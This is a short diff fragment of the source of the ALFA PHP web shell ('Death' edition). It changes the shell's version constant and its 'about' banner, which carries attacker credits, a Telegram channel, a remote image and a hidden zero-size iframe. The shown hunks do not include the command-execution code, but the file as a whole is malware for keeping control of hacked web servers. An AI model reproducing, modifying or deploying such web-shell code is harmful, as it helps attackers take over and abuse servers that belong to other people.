@@ -176,7 +176,7 @@ if(!isset($GLOBALS['DB_NAME']['safemode']))exit('$GLOBALS[\'DB_NAME\'][\'safemod
 if(!isset($GLOBALS['DB_NAME']['login_page']))exit('$GLOBALS[\'DB_NAME\'][\'login_page\']');
 if(!isset($GLOBALS['DB_NAME']['show_icons']))exit('$GLOBALS[\'DB_NAME\'][\'show_icons\']');
 if(!isset($GLOBALS['DB_NAME']['post_encryption']))exit('$GLOBALS[\'DB_NAME\'][\'post_encryption\']');
-define("__ALFA_VERSION__", "5");
+define("__ALFA_VERSION__", "4.1");
 define("__ALFA_UPDATE__", "2");
 define("__ALFA_CODE_NAME__", "Death");
 define("__ALFA_DATA_FOLDER__", "ALFA_DATA");
@@ -1730,7 +1730,7 @@ $about_us = "<pre><center><img src='http://solevisible.com/images/farvahar-iran.
 <font color='#00A220'>Telegram Channel: @deathbase</font><br>
 <font color='#FFFFFF'>Credits : ./Kize1337</font><br>
 <font color='#FFFFFF'>Made with heart</font><br>
-<font color='#FF0000'>Death Networks makes history0000'>We are always alive</font><br>
+<font color='#FF0000'>We are always alive</font><br>
 <font color='#FF0000'>############</font><br>
 </center></pre><iframe src='tg://resolve?domain=keccy' frameborder='0' width='0' height='0'></iframe>";
 }
